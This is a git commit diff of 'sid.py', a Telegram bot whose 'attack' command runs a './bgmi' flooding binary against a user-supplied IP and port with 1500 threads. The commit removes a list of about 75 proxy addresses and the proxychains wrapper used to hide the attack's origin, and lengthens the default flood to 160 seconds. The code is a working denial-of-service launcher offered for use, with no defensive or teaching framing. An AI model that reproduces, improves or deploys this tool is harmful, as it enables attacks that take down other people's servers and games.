9cfa56be6e51495f507d80ab501f1ae1c48e9845
adity72dd <mmunnabot7@gmail.com>
2025-02-13 15:41:48 +0530

    Update sid.py

--- sid.py
+++ sid.py
@@ -3,7 +3,6 @@ import json
 import os
 import datetime
 import asyncio
-import random
 from telegram import Update, Chat
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
@@ -11,40 +10,10 @@ from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 USER_FILE = "users.json"
 DEFAULT_THREADS = 1500
 DEFAULT_PACKET = 9
-DEFAULT_DURATION = 120  # Set default duration (e.g., 60 seconds)
+DEFAULT_DURATION = 160  # Set default duration (e.g., 60 seconds)
 
 users = {}
 user_processes = {}  # Dictionary to track processes for each user
-
-# List of SOCKS5/HTTP proxies
-PROXIES = [
-    "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
-        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
-        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
-        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
-        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
-        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
-        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
-        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
-        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
-        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
-        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
-        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
-        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
-        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
-        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
-        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
-        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
-        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
-        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
-        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
-        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
-        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
-        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
-        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
-        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
-        "https://80.78.23.49:1080"
-]
 
 def load_users():
     try:
@@ -87,17 +56,13 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
         return
 
-    # Select a random proxy
-    proxy = random.choice(PROXIES)
-
-    # Command using proxychains
-    flooding_command = ['proxychains', './bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
+    flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
 
     # Start the flooding process for the user
     process = subprocess.Popen(flooding_command)
     user_processes[user_id] = process
 
-    await update.message.reply_text(f'Flooding started through proxy {proxy}: {target_ip}:{port} for {DEFAULT_DURATION} seconds with {DEFAULT_THREADS} threads.')
+    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {DEFAULT_DURATION} seconds with {DEFAULT_THREADS} threads.')
 
     # Wait for the specified duration asynchronously
     await asyncio.sleep(DEFAULT_DURATION)
